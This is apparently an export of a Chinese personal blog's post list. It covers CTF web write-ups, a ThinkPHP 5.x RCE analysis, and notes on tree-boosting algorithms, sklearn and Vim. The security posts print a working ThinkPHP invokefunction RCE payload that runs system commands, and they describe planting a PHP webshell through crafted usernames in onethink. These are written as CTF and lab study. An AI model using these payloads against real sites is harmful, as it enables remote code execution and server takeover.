1http://localhost/qwb/web2/xk0SzyKwfzw.php?z5c_TrB=whoami&amp;xd0UXc39w=whoami&amp;xd0UXc39w=whoami&amp;DdWk_nXmZTF_Dt=whoami&amp;dthxTqRPg8YtH=whoami&amp;ImPVuGCXfrS=whoami&amp;O0yRgyjaOF7m=whoami&amp;DeMcscsp=whoami&amp;YV8nqJDhD=whoami&amp;EMNPxS2A7=whoami&amp;kBVLzQEgb=whoami&amp;kBVLzQEgb=whoami&amp;Efa5BVG=whoami&amp;i_QfWB2x1=whoami&amp;i_QfWB2x1=whoami&amp;E8NPXbr7Cq=whoami&amp;zfEddFlxaK_FTO3A=whoami&amp;qjWSY5fjcgNtb=whoami&amp;qUVRuZTF27EhUKTI=whoami 由于不想挨个找参数，我直接替换掉每个参数： 12url='http://localhost/qwb/web2/xk0SzyKwfzw.php?z5c_TrB=whoami&amp;xd0UXc39w=whoami&amp;xd0UXc39w=whoami&amp;DdWk_nXmZTF_Dt=whoami&amp;dthxTqRPg8YtH=whoami&amp;ImPVuGCXfrS=whoami&amp;O0yRgyjaOF7m=whoami&amp;DeMcscsp=whoami&amp;YV8nqJDhD=whoami&amp;EMNPxS2A7=whoami&amp;kBVLzQEgb=whoami&amp;kBVLzQEgb=whoami&amp;Efa5BVG=whoami&amp;i_QfWB2x1=whoami&amp;i_QfWB2x1=whoami&amp;E8NPXbr7Cq=whoami&amp;zfEddFlxaK_FTO3A=whoami&amp;qjWSY5fjcgNtb=whoami&amp;qUVRuZTF27EhUKTI=whoami'print(url.replace('whoami','cat /flag')) 访问得到flag 强网先锋 上单 进入界面，发现thinkphp版本为5.0.22，立刻想到前段时间写过博客的RCE，直接上payload： 1index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag 拿到flag 前两道题的源码 https://github.com/HACHp1/hackable_cms_store/tree/master/qwb","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/tags/Web安全/"}]},{"title":"树相关-XGBoost与LightGBM","slug":"树相关-XGBoost与LightGBM","date":"2019-04-09T09:49:27.000Z","updated":"2025-02-06T15:11:51.802Z","comments":true,"path":"posts/机器学习/20190409-treeAlgorithm2.html","link":"","permalink":"https://hachp1.github.io/posts/机器学习/20190409-treeAlgorithm2.html","excerpt":"前一篇树相关的文章挖了一个XGBoost的坑，在此篇里把坑填上。同时，对XGBoost的改进模型（替代模型）LightGBM作一个介绍。","text":"前一篇树相关的文章挖了一个XGBoost的坑，在此篇里把坑填上。同时，对XGBoost的改进模型（替代模型）LightGBM作一个介绍。 对GBDT的一点补充 上一篇中提到GBDT整个算法的运行过程，将拟合残差操作晋升为对残差在函数空间内的梯度下降。由于是梯度下降，就有学习速度。在传统GBDT中同样有一个学习速度。 XGBoost XGBoost也是提升树的一种。其实它不仅仅是树模型，XGBoost支持树、线性函数甚至自定义函数作为基本弱分类器。虽然在使用时多数情况还是用树作为其弱分类器，但将其作为典型的提升模型更好理解。 XGBoost的算法以及一些细节 总括：XGBoost可以通过对GBDT的一些改动直接得到： 优化目标（代价函数）更合理：XGBoost优化目标由牛顿法得到（拟合二阶泰勒展开），比GBDT的梯度下降（单纯拟合误差）更合理。同时，总代价函数可以使用残差平方和、交叉熵甚至自己定义的二阶可导的函数。 弱分类器本身的生成过程更合理：XGBoost优化函数中添加了正则项，可以起到预剪枝的作用，防止过拟合。使用的信息增益函数是考虑到牛顿法和正则项之后的综合式子。 特征选择的改进：借鉴了RF的方法，每次计算只抽取部分特征。 模型更灵活（可选，因为一般还是用XGBoost本身的树模型）：GBDT以CART为基本弱分类器；XGBoost可以使用树、线性函数甚至自定义函数作为弱分类器。 正则项的定义与详细意义 XGBoost的正则项为： \\[ \\gamma T+\\frac{1}{2}\\lambda \\sum^{T}_{j=1}\\omega^2_j \\] 其中，T为叶子节点个数，\\(\\omega\\)为叶子节点分数（叶子节点的预测值）。 代价函数（牛顿法使之最小） \\[ L(\\theta)=\\sum_{i=1}^T l(y_i,y_{pred_i})+ \\gamma T+\\frac{1}{2}\\lambda \\sum^{T}_{j=1}\\omega^2_j \\] 增益函数，在代价函数的牛顿法过程中引入分裂代价（即单个弱分类器要最大化的目标，由于使用了牛顿法，与GBDT的思想稍有不同） \\[ Gain=\\frac{G^2_L}{H_L+\\lambda}+\\frac{G^2_R}{H_R+\\lambda}-\\frac{(G_L+G_R)^2}{H_L+H_R+\\lambda}-\\gamma \\] 此式来源于牛顿法，以牛顿法的式子（详见后文的链接）来代表增益程度，同时引入分裂代价\\(\\gamma\\)。在优化单个弱分类器时，使之达到最大即等价于使用二阶泰勒展开的牛顿法对总分类器的优化。 之后，使用穷举或者分段（分段时以二阶导数的值作为权重，核心思想是等分目标函数，具体见wepon的ppt）的方法寻找最优（使Gain函数最大）的分裂点可构造弱分类器。 详细的推导过程：Introduction to Boosted Trees 中文推导过程：http://wepon.me/files/gbdt.pdf 刚开始个人认为的类比GBDT过程的弱分类器优化目标（但实际上没有用）： \\[ -\\frac{G_j}{H_j+\\lambda} \\] 最后的一些思考 在学习GBDT和XGBoost的时候，有一些个人思考。在这里先记下来。 对在函数空间的梯度下降和泰勒展开的思考 首先是泰勒展开，泰勒展开是使构造函数在自变量变化后尽可能使其无限逼近原函数的方法（加大续航能力）。而此处的自变量是该阶段的弱分类器，所以此处使用二阶泰勒展开确实能比单纯的一阶展开更加有效的理由是二阶泰勒对弱分类器的变化有更好的适应性。 另一个角度。这里使用泰勒展开的原因是这里使用了比梯度下降更快的牛顿法进行优化。至于为何更快，因为牛顿法是延二次曲线进行下降，而梯度下降是延直线下降，普适性不如二次函数。 刚开始推导时的几个疑问 在牛顿法的使用中，XGBoost直接将最优化的结果带入了LOSS函数，以化简后的式子中提取出的式子作为Gain函数构造的依据，并且最大化Gain函数。为什么可以直接把假设优化好的函数进一步优化？在XGBoost作者陈天其的slide中直接声明其可以衡量叶子节点的好坏。 在弱分类器构造的过程中，直接使用了Gain函数而不是类似于GBDT的拟合误差的操作。Gain函数的来源是假设当前叶子已取最优，然后在这个基础上又继续可能这里是作者优化的一个操作，但是我没有理解。 解释：\\(w\\)与\\(G\\)、 \\(H\\)是相互独立的，所以可以先得到\\(w\\)关于G和H的表达式后直接对G和H进行优化。这里对w运用泰勒展开巧妙的将待更新函数剥离了出来，使得控制树的准确度的w和控制树结构的G与H可以单独考虑。所以这里进行连续两步优化是没有问题的，因为它们是相互独立的。这里也可以近似的认为，由于分类树确定分裂点后（确定树结构），w也就确定了，所以w可以用G、H来表示。 参考资料 XGBoost: A Scalable Tree Boosting System Introduction to Boosted Trees pdf Introduction to Boosted Trees 机器学习算法中 GBDT 和 XGBOOST 的区别有哪些？ - wepon的回答 - 知乎 GBDT算法原理与系统设计简介,by wepon LGBM LGBM是对XGB在速度与空间代价上进行优化后得到的。 优势 更快的训练效率 低内存使用 支持并行学习 可处理大规模数据 LGBM在表现上（调参与理解）和XGB的不同 直方图算法在划分点上没有预排序精确（只取大概位置），正因如此，反而自带正则化的效果。 单棵树分裂方式不同：XGB按层（一般）、LGBM按深度。 算法细节 直方图算法 把连续的浮点特征值离散化成k个整数，同时构造一个宽度为k的直方图。在遍历数据的时候，根据离散化后的值作为索引在直方图中累积统计量，当遍历一次数据后，直方图累积了需要的统计量，然后根据直方图的离散值，遍历寻找最优的分割点。 减小内存占用，节省7/8 减小split finding时计算增益的计算量， 从O(#data) 降至O(#bins) 直方图作差 一个叶子的直方图可以由它的父亲节点的直方图与它兄弟节点的直方图作差得到，提升一倍速度。 Gradient-based One Side Sampling (GOSS) 在每一次迭代前，利用了GBDT中的样本梯度和误差的关系，对训练样本进行采样:对误差大（梯度绝对值大）的数据保留；对误差小的数据采样一个子集，但给这个子集的数据一个权重，让这个子集可以近似到误差小的数据的全集。 此方法与Focal Loss有相通的地方。Focal Loss是根据各类样本数量调整LOSS函数各类样本的权重达到类似重采样的效果。而这里的GOSS只取部分误差小的并加上权重，从而代替所有误差小的样本，也有一个从权重代替数量的操作。 Exclusive Feature Bundling (EFB) 在特征维度很大的数据上，特征空间一般是稀疏的。利用这个特征可以无损地降低构造特征直方图（训练GBDT的主要时间消耗）需要遍历的特征数量。 对于稀疏特征，只需要 O(2 * #non_zero_data) 来构建直方图。 带深度限制的 Leaf-wise 的叶子生长策略 XGB分裂方法有两种：Level-wise（预排序算法只支持Level-wise），同一层所有节点都做分裂，最后剪枝；Leaf-wise（直方图法才支持）选取具有最大增益的节点分裂。一般的XGB都使用Level-wise。 LGBM只能使用Leaf-wise，容易过拟合，需要通过max_depth限制模型，防止过拟合。 特征并行与数据并行的优化 在传统并行方法上作出的一些改进。 参考资料 GBDT、XGBoost、LightGBM 的使用及参数调优 GBDT算法原理与系统设计简介,by wepon","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习-算法","slug":"机器学习-算法","permalink":"https://hachp1.github.io/tags/机器学习-算法/"}]},{"title":"Thinkphp 5.x RCE漏洞","slug":"thinkphp-5-x-RCE漏洞","date":"2019-01-23T16:04:00.000Z","updated":"2025-02-06T15:11:51.098Z","comments":true,"path":"posts/Web安全/20190124-5.x RCE.html","link":"","permalink":"https://hachp1.github.io/posts/Web安全/20190124-5.x RCE.html","excerpt":"Thinkphp 5.x RCE漏洞 0x0 概要 Thinkphp为MVC处理结构，通过对路由的解析，使用控制器调用函数。 由于对兼容模式的路由处理没有进行过滤等，可以调用命名空间下的任意函数，从而产生了RCE漏洞。","text":"Thinkphp 5.x RCE漏洞 0x0 概要 Thinkphp为MVC处理结构，通过对路由的解析，使用控制器调用函数。 由于对兼容模式的路由处理没有进行过滤等，可以调用命名空间下的任意函数，从而产生了RCE漏洞。 0x1 基础知识 Thinkphp 兼容模式 兼容模式是用于不支持PATHINFO的特殊环境，使用时，URL地址形如： http://localhost/?s=/home/user/login/var/value 或 ?s=module/controller/action Thinkphp App类的内置函数调用 12345678/** * 执行函数或者闭包方法 支持参数调用 * @access public * @param string|array|\\Closure $function 函数或者闭包 * @param array $vars 变量 * @return mixed */ App::invokeFunction($function, $vars = []) 0x2 代码追踪 按照爆出phpinfo的执行过程跟踪。 POC中，使用invokefunction函数对phpinfo进行调用，且解析url中的vars，将其传入phpinfo中，payload为： 1http://localhost:801/cms/thinkphp/thinkphp_5.0.22/public/index.php?s=index/\\think\\app/invokefunction&amp;function=phpinfo&amp;vars[0]=-1 首先需要对thinkphp的路由操作做分析。 传入兼容模式的s，所以是对s进行路由 1234// 未设置调度信息则进行 URL 路由检测 if (empty($dispatch)) &#123; $dispatch = self::routeCheck($request, $config); &#125; 跟踪至函数内： 12// 路由检测（根据路由定义返回不同的URL调度） $result = Route::check($request, $path, $depr, $config['url_domain_deploy']); 进一步跟踪： 123456789101112if (false !== strpos($url, '?')) &#123; // [模块/控制器/操作?]参数1=值1&amp;参数2=值2... $info = parse_url($url); $path = explode('/', $info['path']); parse_str($info['query'], $var); &#125; elseif (strpos($url, '/')) &#123; // [模块/控制器/操作] $path = explode('/', $url); &#125; else &#123; $path = [$url]; &#125; return [$path, $var]; 可以看到，代码没有对操作做出任何过滤和检测，直接将模块、控制器（命名空间）和操作函数解析了。 运行到此处时，path已经被分割为三部分。 之后，代码就会执行解析好的函数： 1$data = self::exec($dispatch, $config); 执行函数 1234567891011if (is_callable([$instance, $action])) &#123; // 执行操作方法 $call = [$instance, $action]; // 严格获取当前操作方法名 $reflect = new \\ReflectionMethod($instance, $action); $methodName = $reflect-&gt;getName(); $suffix = $config['action_suffix']; $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName; $request-&gt;action($actionName); &#125; 此时，invokefunction已经将传入的函数执行。 0x3 一些坑以及查阅资料得到 对于windows和linux系统，该漏洞的触发情况不一样，windows系统是对大小写敏感的，所以一些函数无法调用。 在本机（windows系统）下测试网上的写入webshell和执行系统命令的POC都失败了，并且在跟踪的过程中发现源代码也不太一样，一是本地测试使用的5.0.22非完整版本，二是本地服务器的安全设置问题。","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://hachp1.github.io/tags/漏洞分析/"}]},{"title":"树相关-从决策树到kaggle大杀器","slug":"树相关-从决策树到kaggle大杀器","date":"2018-12-04T04:19:41.000Z","updated":"2025-02-06T15:11:51.848Z","comments":true,"path":"posts/机器学习/20181204-treeAlgorithm.html","link":"","permalink":"https://hachp1.github.io/posts/机器学习/20181204-treeAlgorithm.html","excerpt":"决策树 决策树的最优分支选择 分类树 枚举所有可能的划分，每次计算一个代价值，取代价最低的分裂方法。 设定一个阈值，若超过，则分裂。 回归树 在一次分裂时，遍历所有划分方法（每次划分为两组，分别计算损失函数并相加），找出损失函数和最小的作为本次分裂；然后使用递归划分出所有可能。 预测时，使用分组的组内平均数作为该组所有元素的预测值；损失函数可以用该组的各值与该组的平均数的残差平方和。","text":"决策树 决策树的最优分支选择 分类树 枚举所有可能的划分，每次计算一个代价值，取代价最低的分裂方法。 设定一个阈值，若超过，则分裂。 回归树 在一次分裂时，遍历所有划分方法（每次划分为两组，分别计算损失函数并相加），找出损失函数和最小的作为本次分裂；然后使用递归划分出所有可能。 预测时，使用分组的组内平均数作为该组所有元素的预测值；损失函数可以用该组的各值与该组的平均数的残差平方和。 普通回归树的训练过程 对回归树结果的不太恰当的通俗理解：在一个局部范围内用平均值来预测这个局部内的所有点的值。 回归树的训练过程是一个递归的过程，首先，从分析一个递归环节开始： 随机选取一个特征 先找到对这个特征的各个二划分点 分别对每个划分点作如下计算： 因为每组的预测值为平均数，第i个分组（一共两个分组）的损失函数L(i)为： \\[ L(i)=\\sum_{j=0}^{1}{(y_i^{(j)}-mean_i)^2} \\] 其中，\\(j\\)为对第i组中每个数的遍历序数，\\(mean_i\\)为第i组的平均数 整个树在此划分下的损失函数为： \\[ L=\\sum_i{L(i)} \\] 比较所有划分，在回归树本次分裂时，取\\(L\\)最小的划分点作为本次划分点，完成一次递归。 经过n次递归达到给定的要求时，回归树停止分裂。 集成树 集成树是树模型的一大类模型(boost模型)，采用各个树的预测值相加作为预测结果的计算方法进行预测。 AdaBoost 一些特征： 1. 首先，AdaBoost是一种二分类算法。 2. 加性模型，使用前向分步算法作为各个数学公式的来源和依据（即公式为啥长这样）。 3. 从训练数据中学习一系列弱分类器或基本分类器，然后将这些弱分类器组合成一个强分类器 4. 通俗理解思想：增大被分错的数据的权重，减小错误率高的弱分类器的作用。整个学习过程就像是先粗略的对整个数据集进行划分（在递归中的第一个分类器），然后对剩下的分错的数据集抽出来重点对待再次划分（递归中的第二个分类器）；通过两种权重的组合（数据权重和弱分类器权重）作用巧妙地得出最终的分类器。这个思想和泰勒展开有着异曲同工之妙，即先大概分，再细分；先整体符合，再对细节下手。 5. 关键：1、如何更新数据的权重。2、如何组合弱分类器（分类器权重）。 整个函数的目的是将\\(X\\)映射到\\(\\{-1,1\\}\\)，即求函数:\\(G_m(x)→\\{-1,1\\}\\) 整个过程： 权值初始化，所有权值最开始时都被赋予相同的值： \\[ \\frac{1}{N} \\] 其中，N是总弱学习器的个数。 构建弱分类器 使用具有权值分布\\(D_m\\)的训练数据集学习，得到基本分类器（具体过程：穷举每个阈值，使用公式计算误差\\(e_m\\)（公式见后文）选取让误差最低的阈值来设计基本分类器，即一个简单的二分类器） 计算弱分类器权重：思想为根据错误率调整权重的大小，错误率越大，权值越小。整个权值更新过程如下： 首先，计算中间系数\\(α_m\\)，公式为： \\[ α_m=\\frac{1}{2}ln\\frac{1-e_m}{e_m} \\] \\(e_m\\)为误差，计算公式为： \\[ e_m=P(G_m(x_i)≠y_i)=\\sum_{i=1}^{N}w_{mi}I(G_m(x_i)≠y_i) \\] \\(w_{mi}\\)为当前的权重。 \\(I\\)为指示函数，代表的是指示函数（indicator function）。 它的含义是：当输入为True的时候，输出为1，输入为False的时候，输出为0。 然后，更新数据权重，过程为： \\[ D_{m+1}=(w_{m+1,1},...,w_{m+1,i},...,w_{m+1,N}) \\] \\[ w_{m+1,i}=\\frac{w_{mi}}{Z_m}e^{-α_my_iG_m(x_i)},i=1,2,...,N \\] 其中，\\(Z_m\\)的计算过程： \\[ Z_m=\\sum_{i=1}^{N}w_{mi}e^{-α_my_iG_m(x_i)} \\] 重复以上步骤（从构造弱分类器开始），直到触发某终止条件。 最后，将获得的所有弱分类器与其权值相乘并相加，得到最终分类器： \\[ G(x)=sign(f(x))=sign(\\sum^{M}_{m=1}α_mG_m(x)) \\] 此外，最后获得的分类器的误差值\\(e_m\\)有一个上界，其值为： \\[ \\frac{1}{N}\\sum^N_{i=1}I(G(x_i)≠y_i)\\le\\frac{1}{N}\\sum_ie^{-y_if(x_i)}=\\prod_m{Z_m} \\] 还有一些数学特征详见书上。 参考资料: 李航《统计学习方法》 知乎上的一篇精彩解说 机器学习算法中GBDT与Adaboost的区别与联系是什么？- Frankenstein 推荐blog AdaBoost原理（包含权重详细解释） GBDT(Gradient Boosting Decision Tree)梯度上升树 Gradient Boosting是对AdaBoost的推广。 AdaBoost算法中，计算过程没有涉及到凸优化过程，整个过程是通过调整两个权重展开的。 而GBDT从侧面用到了梯度上升的概念（恰巧完成了一个梯度下降的操作）。因此相比AdaBoost, Gradient Boosting可以使用更多种类的目标函数。 GBDT和AdaBoost都结合“从整体到细节”的思想，使每个弱分类器对剩下的细节（即残差或误差量，GBDT是残差）进一步拟合，最后就得到了结果。 整理一下思路，GBDT的过程为：首先通过某种拟合方法找到第一个函数（回归树）\\(h_1(x)\\)（已经通过梯度下降最优化），然后对残差 \\[ \\sum_iy_i-h_1(x_i) \\] 计算并以之为目标函数拟合第二棵回归树。以这种做法递归下去直到达到某种条件即可停止训练。最后的预测函数即 \\[ F(X)=\\sum_i{h(x_i)} \\] 注意，对每个弱分类器的优化是独立于GBDT算法的，优化过程参考以往的学习方法进行，如：梯度下降、穷举。 可以观察到GBDT的一个重要的特性，也就是梯度出现的地方：用回归树去拟合残差其实就是用回归树去拟合目标方程关于\\(F(x_i)\\)的梯度。换句话说，就是拟合残差这一个操作恰巧和梯度下降一步是一样的。 证明： 训练过程中，当前的预测函数即 \\[ F(X)=\\sum_i{h(x_i)} \\] 考虑使用最小二乘代价函数： \\[ L=\\frac{1}{2}\\sum_i(y_i-F(x_i))^2 \\] L对上一个弱分类器单个样本点求偏导有： \\[ \\frac{\\partial{L}}{\\partial{F(x_i)}}=\\frac{\\partial\\frac{1}{2}\\sum_{i}(y_i-F(x_i))^2}{\\partial{F(x_i)}}=-(y_i-F(x_i)) \\] 而\\(y_i-F(x_i)\\)是我们要拟合的对象（GBDT中），所以我们拟合的是代价函数对上一个弱分类器的负梯度。这里联想梯度下降的过程：要更新哪个参数，就对哪个参数求导，所以在这里，我们更新的是弱分类器本身（把上一个分类器当作参数）。将拟合后的结果加入到目标函数中也就相当于对上一阶段加入的弱分类器做了梯度下降。 这就是GBDT中的G（梯度）的来源。 XgBoost XgBoost是GBDT的改进。 XgBoost对GBDT的代价函数加入了正则化项防止过拟合。如，最小二乘代价函数变形为： \\[ L=\\frac{1}{2}\\sum_i(y_i-F(x_i))^2+\\sum_kΩ(f_k) \\] 同时，XgBoost使用二阶泰勒展开来代替GBDT中对上一个弱分类器的一阶导数。 XgBoost相关的解释计划在下一篇继续。 参考资料 XGBoost: A Scalable Tree Boosting System Introduction to Boosted Trees","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习-算法","slug":"机器学习-算法","permalink":"https://hachp1.github.io/tags/机器学习-算法/"}]},{"title":"数据预处理及训练结果评估","slug":"数据预处理及训练结果评估","date":"2018-10-09T04:37:58.000Z","updated":"2025-02-06T15:11:51.668Z","comments":true,"path":"posts/机器学习/20181009-metrics.html","link":"","permalink":"https://hachp1.github.io/posts/机器学习/20181009-metrics.html","excerpt":"数据预处理及训练结果评估 归一化(标准化) 1234#库名from sklearn import preprocessing#使用方法X_scaled = preprocessing.scale(X)","text":"数据预处理及训练结果评估 归一化(标准化) 1234#库名from sklearn import preprocessing#使用方法X_scaled = preprocessing.scale(X) K折验证 12345from sklearn.model_selection import train_test_splitX, y = np.arange(10).reshape((5, 2)), range(5)X_train, X_test, y_train, y_test = train_test_split( X, y, test_size=0.125, random_state=0) # 8折验证 准确率、召回率等 123456789101112131415161718192021from sklearn.metrics import precision_scoreprint(precision_score(y_test,y_predict,average=&apos;micro&apos;))#其中，average可选（常用）：&apos;&apos;&apos;宏平均（Macro-averaging），是先对每一个类统计指标值，然后在对所有类求算术平均值。微平均（Micro-averaging），是对数据集中的每一个实例不分类别进行统计建立全局混淆矩阵，然后计算相应指标。&apos;micro&apos;: 计算准确率 &apos;macro&apos;: 计算每个标签的准确率 &apos;weighted&apos;: 根据每个标签出现的数量按权重计算其准确率&apos;binary&apos;: * 计算二分类的准确率（预测为1的准确率） * 在召回率中，则计算预测为1的占总数的百分比&apos;&apos;&apos; 召回率 123from sklearn.metrics import recall_score recall_score(y_true, y_pred, average=&apos;micro&apos;) # average和上一个类似 f1-score 12f1score(y_true, y_pred, average=&apos;micro&apos;) # average和上一个类似 准确率（sklearn训练） 1print(clf.score(x_train, y_train)) PCA降维 1234567891011import sklearn.decomposition.pca as PCA#PCA降维mypca=PCA.PCA(n_components=2)x_test_de=mypca.fit_transform(x_test)'''其中explained_variance_：方差值explained_variance_ratio_：方差占比singular_values_：分解得到的奇异值（不是奇异向量）inverse_transform(X)：按降维操作逆向升维'''","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习初步","slug":"机器学习初步","permalink":"https://hachp1.github.io/tags/机器学习初步/"}]},{"title":"2018省赛AWD web writeup","slug":"2018省赛AWD","date":"2018-09-22T06:50:50.000Z","updated":"2025-02-06T15:11:50.248Z","comments":true,"path":"posts/Web安全/20180922-Websec2.html","link":"","permalink":"https://hachp1.github.io/posts/Web安全/20180922-Websec2.html","excerpt":"2018年省赛AWD web writeup 一点寒暄 &gt; 本次比赛还是有很多遗憾，AWD做的太少，再加上经验不足，导致结果不好看，下面开始填坑。 网站框架、版本分析 在ThinkPHP路径下找到ThinkPHP.php文件，在其中找到版本号3.2.3，本版本存在缓存漏洞。 找到之后，搜索出相同出处的网页： 阅读获得thinkphp缓存漏洞的提示。","text":"2018年省赛AWD web writeup 一点寒暄 &gt; 本次比赛还是有很多遗憾，AWD做的太少，再加上经验不足，导致结果不好看，下面开始填坑。 网站框架、版本分析 在ThinkPHP路径下找到ThinkPHP.php文件，在其中找到版本号3.2.3，本版本存在缓存漏洞。 找到之后，搜索出相同出处的网页： 阅读获得thinkphp缓存漏洞的提示。 缓存漏洞分析 ThinkPHP缓存漏洞需要在二次开发时，调用框架的S()函数，如果传入S()函数的变量可控，并且能找到缓存的储存地址（主要是文件名），则可以直接写入并连接webshell。 代码调试跟进 本题直接搜索并不能找出漏洞的触发点，因为S()函数并没有直接的被调用，也没有直接被调用的函数调用S()，但是既然是缓存漏洞，先找到缓存的路径，然后随意浏览网页，终于触发了漏洞点。 能够引起缓存函数执行的地方在主页的搜索框里，当进行一次搜索后，发现缓存文件夹下有文件生成了： 然后开始跟进。 首先，清空缓存文件，在主页代码中打断点： 进一步跟进，在一个执行处打下断点（因为执行之后就产生了缓存文件） 继续跟进下一层网页应用执行处 继续调试，发现了使用变量调用函数的地方，并且此处调用了search函数，search函数之中调用了S()函数，终于找到了关键位置 进一步跟进，发现了文件名的处理： 在文件名处理之中，存在一个C()函数，这个函数就是缓存文件名的关键所在，在函数中，$_config[$name]被当做了一个“随机变量”，用于与搜索的关键词组合生成md5。 查看内存中的相应变量的值： 在该变量中储存的随机变量如下，是’sdfdf’的md5码（其实并没有经过md5运算） 最后，全局搜索该md5，发现在config.php文件中就已经赋值好了，算是一个password，可见，本漏洞是已经经过修复的漏洞，只要把密码改掉，想直接得到文件名的概率是极小的： 总结： 查到之前的版本下，缓存漏洞的文件名是直接对传入的文件名进行md5摘要的，而本题的版本已经把它修复了，感觉并不算个漏洞，或者说是已经修复的漏洞。 整个触发流程是： 搜索框搜索-&gt;调用invokeAction函数-&gt;调用搜索函数-&gt;搜索函数内部调用缓存函数-&gt;缓存函数读取缓存密码并拼接md5-&gt;产生文件 但是当时没有改密码的时候还是很容易被打穿的，从被打穿的队伍的网页文件来看，也都是在缓存处出现了问题，可能还有别的漏洞存在。（师傅们应该找到了其他切入点吧） 懒了，先不动了:) 最后，附上源码以供大家玩耍: iseccms源码","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/tags/Web安全/"}]},{"title":"2018年巅峰极客 Web部分writeup","slug":"巅峰极客writeup","date":"2018-07-23T07:10:57.000Z","updated":"2025-02-06T15:11:51.613Z","comments":true,"path":"posts/Web安全/20180723-Websec.html","link":"","permalink":"https://hachp1.github.io/posts/Web安全/20180723-Websec.html","excerpt":"A simple cms writeup 做此题之前刚好做了一道原题，比赛的时候是做到最后一步的，但是出了差错没有出flag，很气。 首先，打开连接，发现是onethink1.0框架。搜索该框架的漏洞，果然发现了getshell利用过程，原理如下: &gt; 该框架是对thinkphp框架的二次开发，会将注册后的用户名内容存入临时php文件中。 我们使用一句话来作为用户名注册账户，在登录后就将其存入缓存文件，最后访问缓存文件即可完成getshell。 原理比较简单，但是具体利用过程有几个关键点: 1. 注册用户名由于特殊字符不能直接输入进输入框。 2. 存放一句话的临时文件名并不知道。","text":"A simple cms writeup 做此题之前刚好做了一道原题，比赛的时候是做到最后一步的，但是出了差错没有出flag，很气。 首先，打开连接，发现是onethink1.0框架。搜索该框架的漏洞，果然发现了getshell利用过程，原理如下: &gt; 该框架是对thinkphp框架的二次开发，会将注册后的用户名内容存入临时php文件中。 我们使用一句话来作为用户名注册账户，在登录后就将其存入缓存文件，最后访问缓存文件即可完成getshell。 原理比较简单，但是具体利用过程有几个关键点: 1. 注册用户名由于特殊字符不能直接输入进输入框。 2. 存放一句话的临时文件名并不知道。 * 对于问题1，可以通过burp修改包完成。 问题二则需要一定技巧。 首先，使用工具扫描网站路径，发现www.zip文件可以直接下载，解压后发现是onethink打包。此时考虑本地复现，从而解决问题2。 解压至xampp文件夹后，访问本地网页发现并不能成功访问，出现数据库错误字样，这是因为本地数据库没有配置的缘故。此处只能重装onethink来解决。 搜索onethink重装方法，按教程搜索并删除子文件夹中的.lock文件，打开install.php文件，完成安装。 进入注册界面，填入信息后，使用burp拦截并更改，将用户名改为%0a$x=$_GET[a];//（说明：%0a为换行符十六进制，为了在文件中换行，//是注释，将一句话后的无关代码注释掉以正常运行） 用同样的方法注册%0apassthru($x);//用户。 进入登录界面，按顺序依次登入以上两个用户（使用burp改用户名）此时，一句话已写入临时文件中。 使用notepad++文件搜索功能搜索payload，查找到一句话文件所在位置（\\Runtime\\Temponethink_6d11f0be3af9c28d4120c8fd5fe65a40.php和\\Runtime\\Temp\\onethink_d403acece4ebce56a3a4237340fbbe70.php文件都可以） 之后访问一句话，可以执行shell命令，搜索目录后得到flag。","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/tags/Web安全/"}]},{"title":"VIM初步","slug":"VIM初步","date":"2018-06-17T11:59:21.000Z","updated":"2025-02-06T15:11:51.138Z","comments":true,"path":"posts/Linux日常/20180617-vim1.html","link":"","permalink":"https://hachp1.github.io/posts/Linux日常/20180617-vim1.html","excerpt":"VIM使用初步 一般指令 查看帮助: help xxx 修改文本指令: 123456789A:到行首第一个非空字符并输入I:到行尾最后一个非空字符并输入c:删除光标所在（后跟其他范围指令表示删除该范围)d:剪切一行x:剪切一个字符dtx :删除所有的内容，直到遇到x号(delete to x)&lt;ctrl + a&gt;:当前数加1&lt;ctrl + x&gt;:当前数减1&lt;ctrl + p\\n&gt;:p:向前补全;n:向后补全。 粘贴模式 set paste","text":"VIM使用初步 一般指令 查看帮助: help xxx 修改文本指令: 123456789A:到行首第一个非空字符并输入I:到行尾最后一个非空字符并输入c:删除光标所在（后跟其他范围指令表示删除该范围)d:剪切一行x:剪切一个字符dtx :删除所有的内容，直到遇到x号(delete to x)&lt;ctrl + a&gt;:当前数加1&lt;ctrl + x&gt;:当前数减1&lt;ctrl + p\\n&gt;:p:向前补全;n:向后补全。 粘贴模式 set paste VIM移动指令： 123456789101112b:光标所在位置的这一个单词首e:光标所在位置的这一个单词尾w:光标所在位置的下一个单词首fx:x为任意字符：在当前行内查找下一个xnfx:第n个字符%:匹配并移动到下一个大中小括号*:匹配并移动到当前光标的下一个单词(相当于 /xxx 之后 n)#:匹配并移动到上一个单词0:移动到行首$:移动到行尾^:行第一个非空g_:行最后一个非空 可视化模式 (参考链接) 12345678910111213141516[ctrl+v]:矩形选择v:字符选择V:行选择对选中的每一行做相应变化:I/A:插入d 删除选中文本c 修改选中文本r 替换选中文本I 在选中文本前插入A 在选中文本后插入gu 选中区域转为小写gU 选中区域转为大写g~ 大小写互调&gt; 向右缩进一个单位&lt; 向左缩进一个单位 宏录制: 